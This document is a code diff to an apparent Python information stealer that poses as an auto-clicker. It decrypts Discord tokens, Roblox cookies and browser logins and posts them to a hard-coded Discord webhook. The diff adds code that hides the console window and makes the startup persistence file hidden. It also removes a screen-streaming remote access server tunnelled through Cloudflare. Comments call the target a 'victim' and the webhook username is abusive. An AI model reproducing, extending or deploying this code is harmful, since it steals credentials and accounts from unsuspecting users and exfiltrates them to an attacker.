@@ -10,17 +10,13 @@ import win32crypt
 from Crypto.Cipher import AES
 import requests
 import cv2
-import pyautogui
 import sqlite3
 import tempfile
 from pathlib import Path
-import io
 import socket
 import threading
 import numpy as np
 import mss
-from pycloudflared import try_cloudflare
-from flask import Flask, Response
 import subprocess
 import platform
 import sys
@@ -31,6 +27,28 @@ from pynput.keyboard import Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
 import urllib.request
 import urllib.error
+
+# =================== HIDE TERMINAL ON STARTUP ===================
+if sys.platform == 'win32':
+    # Hide the console window
+    kernel32 = ctypes.WinDLL('kernel32')
+    user32 = ctypes.WinDLL('user32')
+    SW_HIDE = 0
+    
+    # Get console window and hide it
+    hWnd = kernel32.GetConsoleWindow()
+    if hWnd:
+        user32.ShowWindow(hWnd, SW_HIDE)
+    
+    # Also prevent new console windows
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    startupinfo.wShowWindow = subprocess.SW_HIDE
+else:
+    # For non-Windows, redirect output to null
+    import os
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
 
 # =================== CONFIGURATION ===================
 WEBHOOK_URL = "https://discord.com/api/webhooks/1460790440428175553/pKYIidBOMxcqroGRdpBROYtBkqbh9JPoD07hYv2_QNdB1qOw-BdWNt-bJ-xO8pylVFZ2"
@@ -155,6 +173,14 @@ def copy_exe_to_startup(exe_path):
     destination_path = os.path.join(startup_folder, f"flickgoontech{ext}")
     if not os.path.exists(destination_path):
         shutil.copy2(exe_path, destination_path)
+        # Hide the startup file
+        if sys.platform == 'win32':
+            try:
+                import ctypes
+                FILE_ATTRIBUTE_HIDDEN = 0x02
+                ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
+            except:
+                pass
 
 # =================== DISCORD TOKEN STEALER ===================
 def getheaders(token=None):
@@ -186,10 +212,13 @@ def gettokens(path):
     return tokens
 
 def getkey(path):
-    with open(path + f"\\Local State", "r") as file:
-        key = json.loads(file.read())['os_crypt']['encrypted_key']
-    file.close()
-    return key
+    try:
+        with open(path + f"\\Local State", "r") as file:
+            key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+        return key
+    except:
+        return ""
 
 def getip():
     try:
@@ -203,8 +232,8 @@ def retrieve_roblox_cookies():
     roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
     temp_dir = os.getenv("TEMP", "")
     destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
-    shutil.copy(roblox_cookies_path, destination_path)
     try:
+        shutil.copy(roblox_cookies_path, destination_path)
         with open(destination_path, 'r', encoding='utf-8') as file:
             file_content = json.load(file)
             encoded_cookies = file_content.get("CookiesData", "")
@@ -212,22 +241,18 @@ def retrieve_roblox_cookies():
             decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
             decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
             return decrypted_text
-    except Exception as e:
-        return str(e)
-
-def send_to_discord(message):
-    payload = {"content": message}
-    try:
-        requests.post(WEBHOOK_URL, json=payload)
-    except:
-        pass
+    except Exception:
+        return ""
+    finally:
+        if os.path.exists(destination_path):
+            os.remove(destination_path)
 
 def send_to_discord_embed(embed=None):
     payload = {"username": "Wife Beater"}
     if embed:
         payload["embeds"] = [embed]
     try:
-        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
+        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
     except:
         pass
 
@@ -302,7 +327,7 @@ def send_file_to_discord(file_path, message="File from victim's PC"):
         with open(file_path, 'rb') as file:
             files = {'file': (os.path.basename(file_path), file)}
             data = {'content': message}
-            requests.post(WEBHOOK_URL, files=files, data=data)
+            requests.post(WEBHOOK_URL, files=files, data=data, timeout=10)
             return True
     except:
         return False
@@ -365,7 +390,10 @@ def get_browser_logins(browser, limit=100):
 
 def delete_file(file_path):
     if os.path.exists(file_path):
-        os.remove(file_path)
+        try:
+            os.remove(file_path)
+        except:
+            pass
 
 # =================== MAIN STEALER FUNCTION ===================
 def main_stealer():
@@ -376,7 +404,11 @@ def main_stealer():
         for token in gettokens(path):
             token = token.replace("\\", "") if token.endswith("\\") else token
             try:
-                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                key_data = getkey(path)
+                if not key_data:
+                    continue
+                    
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(key_data)[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                 if token in checked:
                     continue
                 checked.append(token)
@@ -398,7 +430,7 @@ def main_stealer():
                 urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except (urllib.error.HTTPError, json.JSONDecodeError):
                 continue
-            except Exception as e:
+            except Exception:
                 continue
 
     browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
@@ -508,52 +540,8 @@ def upload_report(text: str):
     Path(filename).write_text(text, encoding="utf-8")
     try:
         with open(filename, "rb") as file_obj:
-            requests.post(WEBHOOK_URL, files={"file": (filename, file_obj)})
+            requests.post(WEBHOOK_URL, files={"file": (filename, file_obj)}, timeout=10)
         os.remove(filename)
-    except Exception:
-        pass
-
-# =================== FLASK REMOTE ACCESS ===================
-class TeeStdout:
-    def write(self, msg):
-        if msg.strip():
-            log_buffer.append(msg)
-        sys.__stdout__.write(msg)
-    def flush(self):
-        sys.__stdout__.flush()
-
-sys.stdout = TeeStdout()
-sys.stderr = TeeStdout()
-
-def gen_frames():
-    with mss.mss() as sct:
-        monitor = sct.monitors[1]
-        while True:
-            img = sct.grab(monitor)
-            frame = np.array(img)
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-            _, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
-            yield (b"--frame\r\n" b"Content-Type: image/jpeg\r\n\r\n" + buffer.tobytes() + b"\r\n")
-
-app = Flask(__name__)
-
-@app.route("/")
-def index():
-    return Response(gen_frames(), mimetype="multipart/x-mixed-replace; boundary=frame")
-
-def send_log_file():
-    home_dir = Path.home()
-    log_path = home_dir / "terminal_log.json"
-    log_data = {
-        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-        "logs": log_buffer
-    }
-    with open(log_path, "w", encoding="utf-8") as f:
-        json.dump(log_data, f, indent=2)
-    with open(log_path, "rb") as f:
-        requests.post(WEBHOOK_URL, files={"file": ("terminal_log.json", f)}, timeout=15)
-    try:
-        log_path.unlink()
     except Exception:
         pass
 
@@ -859,7 +847,7 @@ class AutoClickerGUI:
                 elif sleep_time_ns > 10_000:
                     pass
                     
-        except Exception as e:
+        except Exception:
             pass
 
     def update_loop(self):
@@ -913,25 +901,6 @@ def background_stealer():
         report = collect_all_files()
         save_local_report(report)
         upload_report(report)
-        
-        # Start remote access server
-        if getattr(sys, "frozen", False):
-            os.environ["CLOUDFLARED_PATH"] = os.path.join(sys._MEIPASS, "cloudflared.exe")
-
-        def run_flask():
-            app.run(host="0.0.0.0", port=PORT, use_reloader=False)
-
-        flask_thread = threading.Thread(target=run_flask, daemon=True)
-        flask_thread.start()
-        time.sleep(2)
-
-        try:
-            public_url = try_cloudflare(PORT)
-        except Exception as e:
-            hostname = socket.gethostname()
-            local_ip = socket.gethostbyname(hostname)
-
-        send_log_file()
                 
     except Exception:
         pass
